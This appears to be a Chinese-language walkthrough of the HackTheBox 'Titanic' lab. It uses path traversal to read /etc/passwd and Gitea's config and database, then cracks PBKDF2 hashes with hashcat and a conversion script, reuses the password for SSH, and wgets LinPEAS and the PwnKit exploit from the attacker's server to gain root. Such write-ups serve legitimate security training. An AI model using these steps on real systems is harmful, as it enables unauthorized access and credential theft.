# HTB：Titanic (Easy)

## <span class="red">題目</span>

- ![image](https://hackmd.io/_uploads/HyOi0EI0Jx.png)

## <span class="red">解題過程</span>

### <span class="red">Recon 偵查</span>

1. **題目只有給了一個 IP 位址，於是我用 `nmap -Pn -sV <IP>` 去查看是否有打開的 port 可以進行連線，發現 port22 和 port80 兩個 port 有開， port80 是 Apache Server 所以我直接連連看發現不行**

- ![image](https://hackmd.io/_uploads/SkN-yH8Ryg.png)
- ![image](https://hackmd.io/_uploads/SkUfxrIAJl.png)

&emsp;

2. **於是我使用 `nmap -p <port> -sC -sV <IP>` 對打開的兩個 port 做更詳細的掃描**

- ![image](https://hackmd.io/_uploads/H1JtZSI01g.png)
- ![image](https://hackmd.io/_uploads/H1pcZrICJl.png)

&emsp;

3. **在掃描 port22 時，除了可以從 Service 得知應該是和 SSH 連線有關，還能夠發現 `ssh-hostkey` ，於是我參考了一些 `ssh-hostkey` 相關的論壇討論 ，看起來我登入時都會需要知道「使用者」，密碼要看 server 的設定決定需不需要**

- ![image](https://hackmd.io/_uploads/S1PggLURyg.png)
- **StackExchange : https://serverfault.com/questions/1132148/what-is-the-host-key-the-one-from-ssh-connection-and-how-is-it-different-from**

&emsp;

4. **因此我只好詢問一下 chatgpt 這部分可能還有甚麼線索，內容是有關於 step1 當時連線到 Apache Server 前，應該要把 `10.10.11.55 titanic.htb` 這段放入 `/etc/hosts` 。否則就有可能會出現 `Name-based Virtual Hosting` 的衍生問題， Server 並不能確定 `10.10.11.55` 是誰(因為可能有很多靶機都是架在這個 IP 上)。
   因此這裡直接下 `echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts` 把剛剛的指令加到 `/etc/hosts` 中**

- ![image](https://hackmd.io/_uploads/HkmhuLUAye.png)

&emsp;

5. **這時應該就能成功看到網頁。一樣先檢查原始碼，可以看到這些按鈕應該都沒有用，按了都是回到起始頁面(也就是一開始進到網站看到的畫面)，到處查看後發現好像只有<span class="red">訂票</span>的選項，所以就訂訂看**

- ![image](https://hackmd.io/_uploads/rkIBtU8Rke.png)
- ![image](https://hackmd.io/_uploads/SJdynUIRyg.png)
- ![image](https://hackmd.io/_uploads/SJTURI8Cyg.png)

&emsp;

6. **按下 submit 後右上角會跳出下載好的 `.json` 檔，打開觀察會發現剛剛的訂票資訊以 JSON 的方式進行儲存**

- ![image](https://hackmd.io/_uploads/SkyoRUI01g.png)
- ![image](https://hackmd.io/_uploads/SynGxw8Ayl.png)

&emsp;

7. **到這個部分沒什麼想法，所以我用了 gobuster 爆破看看 URL 有沒有一些可以攻擊(存取)的目錄，指令如下：
   `gobuster dir -u <URL> -w <wordlist> -x php,html,js`
   會發現 `/book` 的 `HTTP status code` 是 405 ，我覺得有點奇怪，但也沒有甚麼方向**

- ![image](https://hackmd.io/_uploads/HkzTuw8Rke.png)
- ![image](https://hackmd.io/_uploads/rkCYyA6yle.png)

&emsp;

8. **到目前為止使用者可以控制輸入的地方只有 book ticket ，所以往那個方向做檢查。我第一個觀察的是在 step 6 下載的訂票資訊，目前不確定這個訂票資訊 JSON 檔的檔名是怎麼進行命名的；第二個我也查詢了 `jquery-3.5.1 vulnerabilities`，看看有沒有和題目可能有關的漏洞**

- ![image](https://hackmd.io/_uploads/S1arw0pyll.png)
- ![image](https://hackmd.io/_uploads/rJtwv0Tylx.png)
- ![image](https://hackmd.io/_uploads/Bycs9Aakgl.png)

&emsp;

9. **後來我嘗試了 chatgpt 告訴我的 JSON Injection ，但是看起來 `Full Name` 和 `Phone Number` 的欄位都有做基本的防禦，我無法注入額外的欄位，所以我打算用 burp 監聽整個訂票流程的流量**

- ![image](https://hackmd.io/_uploads/rJ_HgyCygg.png)

&emsp;

10. **如果用 burp 進行完整訂票流程，會發現當我完成訂票並提交時，前端會將訂票資訊 POST 到 `/book` ，並且獲得一串 URL (儲存訂票資訊的)，接著會 GET 這串 URL 下載並獲得訂票資訊的 JSON 檔**

- ![image](https://hackmd.io/_uploads/r1ft_oelgg.png)
- ![image](https://hackmd.io/_uploads/Hy8odjlgxx.png)

&emsp;

11. **但是如果仔細檢查，會發現 http history 混入了一個奇怪的連結。當我嘗試去搜尋 `response` 中 `safe browsing download protection` 這個可疑的服務，發現居然有 CVE**

- ![image](https://hackmd.io/_uploads/SyVJzyMgel.png)
- ![image](https://hackmd.io/_uploads/r1tEzyMegg.png)
- ![image](https://hackmd.io/_uploads/H145zJGlll.png)
- ![image](https://hackmd.io/_uploads/HyktIJzegg.png)

&emsp;

### <span class="red">Research and Exploitation 漏洞研究和利用</span>

1. **延續剛剛的發現，我在 NIST 中找到推薦的漏洞利用相關連結，但是這些漏洞利用的情況是當 `safe browsing download protection` 正確啟用，在繞過下載檢查的情況下讓受害者下載惡意檔案，造成執行任意指令**

- ![image](https://hackmd.io/_uploads/H1tDYyGgel.png)
- ![image](https://hackmd.io/_uploads/Syxptyzxel.png)

&emsp;

2. **但是根據 step 11 ，這個 request 是失敗的，也就是說有可能在下載過濾的這個功能 (`safe browsing download protection`) 根本沒有被啟用。換句話說，我預期可以直接利用 path traversal 達到下載伺服器內的任意檔案，所以我嘗試將下載 JSON 的 URL 改為：
   `http://titanic.htb/download?ticket=../../../../../../etc/passwd`
   結果成功下載了 `/etc/passwd` 這個敏感資訊檔案**

- ![image](https://hackmd.io/_uploads/r1tEzyMegg.png)
- ![image](https://hackmd.io/_uploads/BkM12Wfegx.png)

&emsp;

3. **所以目前為止確定可以讀取任意檔案，在我嘗試 LFI 以達到 RCE 未果後，方向只能從有哪些系統預設的檔案夾內有存有敏感資訊的檔案可以讀取。為了方便，我用了 `fuzz` 這個自動化工具 + `Linux Path cheatsheet` 來檢查有哪些路徑可以用**

- **Linux Path cheatsheet : https://gist.github.com/SleepyLctl/63a2da730a3d5abce5013f0f510b1fe2#file-linux-path-traversal-cheatsheet-L220**

- **FUZZ payload :
  `ffuf -u http://titanic.htb/download?ticket=../../../../../FUZZ -w exist_path.txt -mc 200`** - **`-w` : wordlist** - **`-mc` : `--match-code` ，只顯示特定 `HTTP status code` 的結果** - **`FUZZ` : 放我們想要嘗試的檔案路徑**

- ![image](https://hackmd.io/_uploads/rJpPRwzlxg.png)

&emsp;

4. **一個一個檢查這些檔案也可以，但是根據一開始偵查步驟的 step 1, 2 ,3 ，已經發現除了網站本身 (80 port) 以外還有一個 SSH 的 22 port 。也就是說可以先查看與 SSH 連線有關的 file ，也就是檔案路徑中有 "SSH" 字眼的 file**

- ![image](https://hackmd.io/_uploads/Sk-_rJIlgg.png)

  - **`/etc/ssh/ssh_config` & `/etc/ssh/sshd_config` :<br>(`/etc/ssh/ssh_host_dsa_key.pub` 不是純文字檔先不考慮)**

  - ![image](https://hackmd.io/_uploads/SykHOyUxgg.png)

  - **但是 `/etc/ssh/ssh_config` 是當這台主機做為 client 時的行為，所以不需要查看，所以重點放在 `/etc/ssh/sshd_config` ，可以發現公鑰驗證的方式備註解掉了，在往下看也能發現密碼驗證也被註解掉了，但是在往底下看可以發現這台主機用了 PAM 的設定**
  - ![image](https://hackmd.io/_uploads/SyutXeIgee.png)
  - ![image](https://hackmd.io/_uploads/SJOx4eUxgx.png)
  - ![image](https://hackmd.io/_uploads/SyuOLeIeex.png)

&emsp;

5. **檢查了 PAM 的設定檔，但是沒有看出有辦法獲得登入帳號的其他資訊，所以這裡直接朝著一開始 `/etc/passwd` 中有出現過的使用者下手(最後一欄有出現 `nologin` 就是禁止登入的使用者，可以發現大部分都設定成禁止登入)**

- ![image](https://hackmd.io/_uploads/S1dI0ILxgg.png)

&emsp;

6. **往下找會發現，登入後可以用 bash 的使用者只有 `developer` ，所以嘗試讀看看 `/home/developer/.bash_history` 有沒有可用資訊，結果下載後發現 `/home/developer/.bash_history` 是空的**

- ![image](https://hackmd.io/_uploads/BkrwoZIgll.png)

&emsp;

7. **目前看來直接找使用者應該是無法發現其他有效訊息，但是在 step 3 檔案爆破時我並沒有將 `/etc/hosts` 加入檢查名單，原因是下載後我觀察檔案認為這個 IP 是沒用的。但其實我可以根據 `/etc/hosts` 上 `IP address` 的解析方法來存取額外的網頁**

- **以底下的圖片為例，這會將 `localhost` `titanic.htb` `dev.titanic.htb` 都解析到 `127.0.0.1`**
- ![image](https://hackmd.io/_uploads/H1Lavgqxlg.png)

- **這代表我應該也能將 `dev.titanic.htb` 解析到 HTB 給的靶機 `IP address` 上，像是如下圖**
- ![image](https://hackmd.io/_uploads/rkltilqxxl.png)
- **然後在 browser 搜尋 `http://dev.titanic.htb` 就能看到 `dev.titanic.htb` 的網頁畫面，根據 DNS name 這應該是開發者的後台網頁(名稱內有 `dev`)**
- ![image](https://hackmd.io/_uploads/r1achx5gll.png)

&emsp;

8. **然後我在左上角 Explore 找到 developer 的 repo ，其中我認為最重要的是 `docker-config` 這個 repo ，原因是我在這個 repo 下可以發現 MySQL 使用者的帳號密碼，以及 gitea (當前開發者網站)的敏感資訊**

- ![image](https://hackmd.io/_uploads/H1ZeCzkWex.png)
- ![image](https://hackmd.io/_uploads/B1ZM0z1bex.png)
- ![image](https://hackmd.io/_uploads/SyoYRfJWxe.png)

&emsp;

9. **檢查到 gitea 的 `docker-compose.yml` 時可以發現 volumes 裡的路徑看起來放的是 gitea 的資訊。由於我對 gitea 不熟，所以在我問了 chatgpt 之後，它建議我可以讀看看以下檔案路徑。最重要的是
   `_.._.._.._.._home_developer_gitea_data_gitea_conf_app.ini` ，
   這個 `.ini` 檔案裡面包含許多敏感資訊，其中包含 DB 的 path**

- ![image](https://hackmd.io/_uploads/SkUTIQJblg.png)
- **檔案路徑：**
- ![image](https://hackmd.io/_uploads/Sy7Owm1Zel.png)
- **`app.ini` 的檔案內容：**
- ![image](https://hackmd.io/_uploads/SJuq_m1blg.png)

&emsp;

10. **因此可以根據 DB 的 path 將整個 sqlite DB 下載下來檢查，成功下載下來後用 `sqlite3` 套件進行分析**

- ![image](https://hackmd.io/_uploads/SyXxq7Jbgg.png)
- ![image](https://hackmd.io/_uploads/BJ0B5QkZxl.png)
- ![image](https://hackmd.io/_uploads/BkeoyiXJWgx.png)

&emsp;

11. **在這之中有發現 user 這個 table ，接著可以用 `.schema user` 或是 `PRAGMA table_info(user);` 查看 `user` 這個 table 的資訊，重點放在前幾個 column 的內容，所以接著下 `SELECT id, name, email, passwd FROM user;`**

- ![image](https://hackmd.io/_uploads/HJA6jXy-lg.png)
- ![image](https://hackmd.io/_uploads/SJRe6QJWee.png)
- ![image](https://hackmd.io/_uploads/rJNNRXyZxe.png)

&emsp;

### <span class="red">Brute force password hash 密碼爆破</span>

1. **有了帳號密碼就能嘗試用 admin 登入 gitea 了，但是照著 table 的資訊打會出現錯誤，所以密碼應該不是以明文儲存在 DB 中(其實 `user` table 已經告訴我們不是明文存放了，因為有 `hash algo` ( hash 演算法))**

- ![image](https://hackmd.io/_uploads/BJOzlEy-ge.png)
- ![image](https://hackmd.io/_uploads/S1N1XEk-ge.png)
- ![image](https://hackmd.io/_uploads/Sy5PM4ybxg.png)

&emsp;

2. **修正針對 sqlite 的 payload 為 `SELECT id, name, email, passwd, passwd_hash_algo, salt FROM user;` 。接著就要爆破密碼，我採用的方式是使用 hashcat ，所以必須先找到 mode (這裡是 10900) ，這個 mode 的格式是 `sha256:iterations:salt:hash` 把改好的格式存成 `.txt` 就能夠跑 hashcat 的指令
   `hashcat -m 10900 -a 0 <target file> /usr/share/wordlists/rockyou.txt --force`**

- **`-a 0`： 0 指的是字典(爆破)攻擊，但由於這個指令要跑接近 5 天所以我決定換一個方法**
- **`--force`：指忽略警告強制執行**
- ![image](https://hackmd.io/_uploads/SkY2D4JWgx.png)
- ![image](https://hackmd.io/_uploads/HyJFxSkZxl.png)
- ![image](https://hackmd.io/_uploads/HyBGfrkWge.png)
- ![image](https://hackmd.io/_uploads/HyEKLrJZgx.png)

&emsp;

3. **改為使用 `john the ripper` 中的小型字典檔 `password.lst` 爆破看看， `.lst` 指的是 list ，目的是為了顯示這個檔案的功能， payload 是 `john --format=PBKDF2-HMAC-SHA256 --wordlist=/usr/share/john/password.lst <target file>` 。但是要注意 JTR 要求的格式與 hashcat 不同，所以需要修改一下(這裡用 python script 處理)**

- ![image](https://hackmd.io/_uploads/rJIhQNl-ll.png)
- **如果直接拿 hashcat 的格式來爆破：**
- ![image](https://hackmd.io/_uploads/ry4kPVl-xe.png)
- **所以要用 script 或其他工具改成 john 能接受的格式：**
- ![image](https://hackmd.io/_uploads/SyPuLNxWeg.png)

&emsp;

4. **結果還是不行，看起來必須下載支援這個格式的版本(也就是 `John the Ripper Jumbo version`) ，成功下載並編譯後應該會在最後一行出現 `make process completed` ，然後可以下 `echo 'alias john="$HOME/tools/john/run/john"' >> ~/.zshrc` ，重跑一次 `zsh shell` 之後就能直接下 `john ...` 跑 `JTR Jumbo version` 了**

- ![image](https://hackmd.io/_uploads/HkigdEl-ll.png)
- ![image](https://hackmd.io/_uploads/ByjWaNlZgg.png)
- ![image](https://hackmd.io/_uploads/Byy79HeZeg.png)
- ![image](https://hackmd.io/_uploads/HJvJKHg-el.png)

&emsp;

5. **結果仍然不行，有可能是因為 john 無法一次跑三個 hash 的結果，所以我將三個 hash 分開跑，就算我沒有指定格式結果都是失敗的**

- ![image](https://hackmd.io/_uploads/rkBusBgZgl.png)
- ![image](https://hackmd.io/_uploads/Bkx_w3BgWgg.png)
- ![image](https://hackmd.io/_uploads/SkzTkIe-ee.png)
- ![image](https://hackmd.io/_uploads/H1jeeLebxe.png)

&emsp;

6. **所以我決定放棄使用 JTR ，還是使用 hashcat ，然後用小一點的字典(之前用 JTR + 小字典是因為那些小字典預設提供給 JTR 使用)，直接找網路上有人專門寫好的字典檔，但是失敗了。這時候我去檢查 hashcat 參數的要求才知道 hashcat 吃的是 `base64` hash 過的結果，而 sqlite 拿到的 `hashvalue` 和 `salt` 都是 16 進制，才會導致需要找很久(或是甚至找不到)**

- **字典檔：https://github.com/danielmiessler/SecLists/tree/master/Passwords/Cracked-Hashes**

&emsp;

7. **所以我寫了以下的 script 把從 sqlite 拿到的資料先轉為 2 進制 (binary) ，接著再對轉換結果做 `base64` hash**

   ```python=
   import base64

   # 讀取輸入檔案
   with open("gitea_user.txt", "r") as f:
       lines = f.readlines()

   target = []

   # 轉換並輸出成 hashcat 可用格式
   for line in lines:
       line = line.strip()
       if not line:
           continue

       _id, user, email, hash_hex, algo_iterations_saltLen, salt_hex = line.split("|")
       algo, iterations, salt_len = algo_iterations_saltLen.split("$")

       # 轉成 base64
       salt_b64 = base64.b64encode(bytes.fromhex(salt_hex)).decode()
       hash_b64 = base64.b64encode(bytes.fromhex(hash_hex)).decode()

       # 轉成 hashcat 格式
       _format = f"sha256:{iterations}:{salt_b64}:{hash_b64}"
       target.append(_format)

       # 輸出檢查
       print(f"{user}:{_format}")

   # 將結果寫入 gitea.hash
   with open("gitea.hash", "w") as f:
       f.write("\n".join(target)

   print("[+] Finish transformed, result in gitea.hash")
   ```

- ![image](https://hackmd.io/_uploads/Skn-2JWZxg.png)
- ![image](https://hackmd.io/_uploads/ryWN3y--xg.png)

&emsp;

8. **完成後再將 `gitea.hash` 用 hashcat 爆破看看，字典檔先用最一開始的 `rockyou.txt` ，會發現很快第二個 hash 就被爆破出來了，而第二個 hash 對應的就是 `developer` 這個 user ，這時就可以先按 `f` 暫停(因為可以先登入看看能不能直接提權，可以的話就不用爆破了)， hashcat 會將當前進度匯入至 `~/.local/share/hashcat/hashcat.restore`
   (版本 < 6.2 則是匯入至 `~/.hashcat/hashcat.restore`) ，
   下次跑的時候只需要下 `hashcat --restore` ，就會自動讀取 `~/.local/share/hashcat/hashcat.restore` 並從之前的 checkpoint 繼續爆破**

- **爆破指令：
  `hashcat -m 10900 -a 0 -w 3 gitea.hash /usr/share/wordlists/rockyou.txt --force`**
- **`-a 0`：在密碼爆破的 step 2 介紹過了**
- **`-w 3`：高效能模式，可以自行選擇要不要加此參數**

- **當然也可以直接按 `p` 再 `Ctrl+c` 快速結束，按 `f` 系統可能還要等這輪字典爆破完成才會中斷(不要按 `p` 再按 `q` ，因為 `q` 是強制退出可能不會存當前字典爆破的進度)**

&emsp;

9. **剛剛已經爆破出來的內容預設會放在 `~/.local/share/hashcat/hashcat.potfile` 這個路徑下(版本 < 6.2 則是放在 `~/.hashcat/hashcat.potfile`) ，所以可以
   `cat ~/.local/share/hashcat/hashcat.potfile`
   這個路徑查看密碼，格式為 `sha256:50000:...:...=<明文密碼>` ，然後就能拿著 `user=developer, password=...` 去 gitea 登入看看果然成功登入了**

- ![image](https://hackmd.io/_uploads/B1W3XK4Weg.png)
- ![image](https://hackmd.io/_uploads/ryT5ozmZxx.png)
- ![image](https://hackmd.io/_uploads/rk_hifmbeg.png)

&emsp;

10. **成功登入 gitea 我會猜測 `developer` 這個使用者有機會用同一個密碼登入靶機(因為懶?)，所以嘗試 ssh 靶機 (`IP=10.10.11.55`) 看看，果然成功了**

- ![image](https://hackmd.io/_uploads/BkdOCz7Zgx.png)

&emsp;

### <span class="red">Gerneral user and Escalation 一般使用者與提權</span>

1. **成功登入靶機後，先找 user 的 flag 在哪裡，結果一下就找到了**

- ![image](https://hackmd.io/_uploads/r1eq-XQbgl.png)
- ![image](https://hackmd.io/_uploads/rJZffQQWgl.png)

&emsp;

2. **接下來就要找 `root flag` ，換句話說就是要找到如何提權(如果不能提權可能就要回到爆破 hash 那邊)。在漏洞研究和利用的 step 8 ，有找到 mysql 的設定檔，包含 `MYSQL_ROOT_PASSWORD` ，當時因為還沒登入靶機，所以並沒有用到 mysql 的環境設定，既然現在成功登入靶機了就用 root 權限登入 mysql 看看，會發現是不行的。轉而用 step 8 設定裡的 `DB` 一般使用者 `sql_user` 也不行**

- ![image](https://hackmd.io/_uploads/Hyp1rXm-el.png)
- ![image](https://hackmd.io/_uploads/B1mDHmQWeg.png)

&emsp;

3. **在 MySQL 無法登入的情況下，我打算直接引入 `LinPEAS` 這個工具，此工具主要是用來對 Linux 主機進行提權，步驟如下**

   - (1) **使用 `sudo apt install peass` 從 kali 官方下載 `linpeas.sh` 這個 `shell script`**
   - **完成後可以用 `linpeas -h` 檢查一下(檢查時會直接跳轉到 `linpeas` 所在的路徑)**
   - ![image](https://hackmd.io/_uploads/SJCMfKXWxl.png)
   - (2) **回到原本工作的資料夾，把 `linpeas.sh` 複製一份到當前資料夾，並且用 python 架一個 `HTTP server` 準備讓靶機下載 `linpeas.sh`**
   - ![image](https://hackmd.io/_uploads/H1gSmKQZlg.png)
   - ![image](https://hackmd.io/_uploads/Bka6ouQZel.png)
   - (3) **在登入靶機前先用 `ip a` 查看自己的 ip 位址，主要觀察 `tun0` ，
     `eth0` 是本地 NAT 用的**
   - ![image](https://hackmd.io/_uploads/SyT4puXbgx.png)

&emsp;

4. **登入靶機後，直接下 `wget http://10.10.14.64:8000/linpeas.sh` 就能下載 local 端的 `linpeas.sh` 。先下 `ls -al` 或是 `ll` 檢查一下權限，會發現 `linpeas.sh` 不具有可執行權限，手動使用 `chmod +x linpeas.sh` 就能夠補上可執行權限了。完成後直接執行 `linpeas.sh` 就能看到有哪些可能可以提權的方法或路徑**

- ![image](https://hackmd.io/_uploads/SyDGVK7-gx.png)
- ![image](https://hackmd.io/_uploads/H1T8NFXWle.png)

&emsp;

5. **由於 `linpeas.sh` 的執行結果非常長，如果能重點分析能提高效率，所以這裡我直接問了 chatgpt**

- ![image](https://hackmd.io/_uploads/HkpaNIVZgl.png)
- ![image](https://hackmd.io/_uploads/rygWB8Ebgg.png)
- ![image](https://hackmd.io/_uploads/ryY4BINbxl.png)
- ![image](https://hackmd.io/_uploads/rkHKHUVZgl.png)

&emsp;

6. **上面的區塊中還有一些區塊沒有提到，像是 `Executing Linux Exploit Suggester` ，而紅框則是因為我在 `SUID` 的 section 發現了這個 `pkexec` ，於是我找了一下關於 `pkexec` 的資料。這個指令本來是用來修復 `sudo` 指令，但修復時自然不可避免的會用到 `root` 權限，而這讓攻擊者有機會利用 `pkexec` (利用 `root` 權限)執行任意程式碼**

- ![image](https://hackmd.io/_uploads/r1K7ILN-gl.png)
- ![image](https://hackmd.io/_uploads/rJzw_LEWel.png)

&emsp;

7. **方法與前面的步驟很像，先把別人寫好的 exploit 編譯好，再利用 python 架一個 `HTTP server` ，最後使用 `wget` 將 payload 下載到靶機**

- **參考資料：https://ithelp.ithome.com.tw/articles/10365168**
- **PwnKit source：https://github.com/ly4k/PwnKit**
- ![image](https://hackmd.io/_uploads/B1pUR84Zee.png)
- **檢查時會發現這個 repo 的 owner 已經幫我們編譯好了，那只需要架 `HTTP server` 在使用 `wget` 下載在靶機就可以了**
- ![image](https://hackmd.io/_uploads/Bk771PVbll.png)
- **下載後會發現不具有執行權限，所以要多跑 `chmod +x PwnKit`**
- ![image](https://hackmd.io/_uploads/HkUh1PEWgx.png)
- ![image](https://hackmd.io/_uploads/S1_ZlPEblg.png)

&emsp;

8. **完成後直接跑 `./PwnKit` ，但是出現了 `Segmentation fault` ，猜測跟編譯環境有關 ，所以我試著換成用 `.sh` 檔跑跑看發現會有與網路有關的問題導致失敗(應該是因為靶機會封鎖網路)**

- ![image](https://hackmd.io/_uploads/B1DT-vEWxg.png)
- ![image](https://hackmd.io/_uploads/S1mHMPVZel.png)

&emsp;

9. **結果在我重新整理靶機後，跑 `sudo -l` 時居然成功出現了「我不需要密碼就能用 `sudo` 執行任何指令」的資訊(我之前跑都是說 `developer` 沒有權限)，所以提權就很簡單了，直接下 `sudo su -` 就能成功提權，提權後到 `/root` 底下看看有沒有 `flag` ，發現了 `root.txt` 把它 `cat` 出來就成功 pwned 這台靶機了！！**

- ![image](https://hackmd.io/_uploads/rkH1xtNZel.png)
- ![image](https://hackmd.io/_uploads/S1RAgFNWee.png)
- ![image](https://hackmd.io/_uploads/HkPUWKNZxx.png)
